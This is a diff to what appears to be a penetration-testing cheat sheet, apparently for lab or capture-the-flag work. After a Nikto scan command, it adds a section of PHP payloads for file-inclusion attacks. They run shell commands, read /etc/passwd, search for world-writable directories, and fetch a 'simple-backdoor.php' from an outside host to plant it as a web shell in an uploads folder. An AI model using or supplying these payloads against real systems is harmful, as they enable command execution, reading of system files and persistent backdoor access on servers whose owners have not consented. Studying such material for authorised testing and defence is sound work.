@@ -127,6 +127,18 @@ openvas-setup
 # ----- NIKTO ----- #
 nikto -host 10.10.10.27 -port 80 -Display -o results.html -Format htm
 
+# ----- PHP LFI/RFI ----- #
+<?php phpinfo(); ?>
+
+<?php echo shell_exec('whoami'); ?>
+
+<?php print system('grep -vE "nologin|false" /etc/passwd|sed "s/ /\n/g"'); ?>
+
+<?php print system('find / -perm -2 -type d 2>/dev/null|sed "s/ /\n/g"'); ?>
+
+<?php file_put_contents("/var/www/html/uploads/nshell.php", file_get_contents("http://10.10.15.99/simple-backdoor.php")) ?>
+
+
 ####################
 ###  EXPLOITATION  #
 ####################
